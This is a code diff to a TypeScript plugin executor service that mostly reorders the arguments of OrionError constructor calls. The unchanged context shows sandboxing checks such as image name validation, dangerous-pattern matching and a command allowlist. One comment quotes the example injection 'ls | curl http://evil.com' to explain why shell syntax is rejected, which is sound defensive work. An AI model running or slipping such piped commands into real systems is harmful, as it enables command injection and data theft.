@@ -503,14 +503,14 @@ export class PluginExecutorService {
     signal?: AbortSignal
   ): Promise<SandboxExecutionResult> {
     if (!this.sandbox) {
-      throw new OrionError(ErrorCode.OPERATION_FAILED, 'Sandbox not initialized');
+      throw new OrionError('Sandbox not initialized', ErrorCode.OPERATION_FAILED);
     }
 
     // 根据安全等级选择执行函数
     const executor = async (signal: AbortSignal) => {
       // 检查是否已取消
       if (signal.aborted) {
-        throw new OrionError(ErrorCode.OPERATION_FAILED, 'Execution aborted');
+        throw new OrionError('Execution aborted', ErrorCode.OPERATION_FAILED);
       }
 
       switch (plugin.securityLevel) {
@@ -566,7 +566,7 @@ export class PluginExecutorService {
     logger.info({ taskId: request.taskId }, 'Executing WASM plugin via QuickJS');
 
     if (signal?.aborted) {
-      throw new OrionError(ErrorCode.OPERATION_FAILED, 'Execution aborted');
+      throw new OrionError('Execution aborted', ErrorCode.OPERATION_FAILED);
     }
 
     // Extract code from plugin config
@@ -624,7 +624,7 @@ export class PluginExecutorService {
 
     if (policy === PullPolicy.Never) {
       if (!existsLocally) {
-        throw new OrionError(ErrorCode.NOT_FOUND, `Image ${image} not found locally and pull policy is 'never'`);
+        throw new OrionError(`Image ${image} not found locally and pull policy is 'never'`, ErrorCode.NOT_FOUND);
       }
       return;
     }
@@ -719,7 +719,7 @@ export class PluginExecutorService {
     logger.info({ taskId: request.taskId }, 'Executing container plugin via Docker');
 
     if (signal?.aborted) {
-      throw new OrionError(ErrorCode.OPERATION_FAILED, 'Execution aborted');
+      throw new OrionError('Execution aborted', ErrorCode.OPERATION_FAILED);
     }
 
     const containerImage = this.sanitizeDockerImage(request.config.image as string);
@@ -734,12 +734,12 @@ export class PluginExecutorService {
     try {
       await this.pullImageIfNeeded(containerImage, pullPolicy);
     } catch (error: any) {
-      throw new OrionError('OPERATION_FAILED', `Image pull failed for ${containerImage}: ${error.message}`)
+      throw new OrionError(`Image pull failed for ${containerImage}: ${error.message}`, 'OPERATION_FAILED')
     }
 
     // Sanitize memory limit to prevent injection
     if (!/^\d+[mkg]$/i.test(memoryLimit)) {
-      throw new OrionError('VALIDATION_ERROR', `Invalid memory limit: ${memoryLimit}`)
+      throw new OrionError(`Invalid memory limit: ${memoryLimit}`, 'VALIDATION_ERROR')
     }
 
     // Create container using spawn with arg arrays (no shell injection)
@@ -760,7 +760,7 @@ export class PluginExecutorService {
       await this.spawnDocker(dockerArgs, signal);
       containerCreated = true;
     } catch (error) {
-      throw new OrionError('OPERATION_FAILED', `Failed to create container: ${error instanceof Error ? error.message : String(error)}`)
+      throw new OrionError(`Failed to create container: ${error instanceof Error ? error.message : String(error)}`, 'OPERATION_FAILED')
     }
 
     // Register with ProcessKiller for container lifecycle management
@@ -816,11 +816,11 @@ export class PluginExecutorService {
     // Allow digest format: name@sha256:xxxx
     const validImageRegex = /^(?:[a-zA-Z0-9](?:[a-zA-Z0-9._-]*[a-zA-Z0-9])?(?::\d+)?\/)?[a-z0-9]+(?:[._-][a-z0-9]+)*(?:\/[a-z0-9]+(?:[._-][a-z0-9]+)*)*(?::[a-zA-Z0-9._-]+)?(?:@[a-zA-Z0-9._-]+)?$/;
     if (!validImageRegex.test(image)) {
-      throw new OrionError('VALIDATION_ERROR', `Invalid Docker image name: ${image}`)
+      throw new OrionError(`Invalid Docker image name: ${image}`, 'VALIDATION_ERROR')
     }
     // Block path traversal attempts
     if (image.includes('..') || image.includes('\0')) {
-      throw new OrionError('VALIDATION_ERROR', `Invalid Docker image name: ${image}`)
+      throw new OrionError(`Invalid Docker image name: ${image}`, 'VALIDATION_ERROR')
     }
     return image;
   }
@@ -903,7 +903,7 @@ export class PluginExecutorService {
     logger.info({ taskId: request.taskId }, 'Executing process plugin via child_process');
 
     if (signal?.aborted) {
-      throw new OrionError(ErrorCode.OPERATION_FAILED, 'Execution aborted');
+      throw new OrionError('Execution aborted', ErrorCode.OPERATION_FAILED);
     }
 
     // Parse command into executable + args (no shell injection)
@@ -997,7 +997,7 @@ export class PluginExecutorService {
 
     for (const pattern of dangerousPatterns) {
       if (pattern.test(command)) {
-        throw new OrionError('OPERATION_FAILED', `Command contains dangerous pattern: ${pattern.source}`)
+        throw new OrionError(`Command contains dangerous pattern: ${pattern.source}`, 'OPERATION_FAILED')
       }
     }
 
@@ -1013,7 +1013,7 @@ export class PluginExecutorService {
     // Check command against allowlist
     const cmdBase = parts[0].toLowerCase();
     if (this.allowedCommands.size > 0 && !this.allowedCommands.has(cmdBase)) {
-      throw new OrionError('OPERATION_FAILED', `Command '${cmdBase}' is not in the allowed commands list`)
+      throw new OrionError(`Command '${cmdBase}' is not in the allowed commands list`, 'OPERATION_FAILED')
     }
 
     // If the command is a simple executable (no shell metacharacters), run without shell
@@ -1027,7 +1027,7 @@ export class PluginExecutorService {
     // commands like "ls | curl http://evil.com" would pass because "ls" is
     // allowed while the injection executes after the pipe.  We cannot safely
     // sanitize arbitrary shell syntax, so we reject it outright.
-    throw new OrionError(ErrorCode.OPERATION_FAILED, 'Plugin execution failed');
+    throw new OrionError('Plugin execution failed', ErrorCode.OPERATION_FAILED);
   }
 
   /**
@@ -1092,7 +1092,7 @@ export class PluginExecutorService {
 
     // 检查是否已取消
     if (signal?.aborted) {
-      throw new OrionError(ErrorCode.OPERATION_FAILED, 'Execution aborted');
+      throw new OrionError('Execution aborted', ErrorCode.OPERATION_FAILED);
     }
 
     // 模拟执行延迟
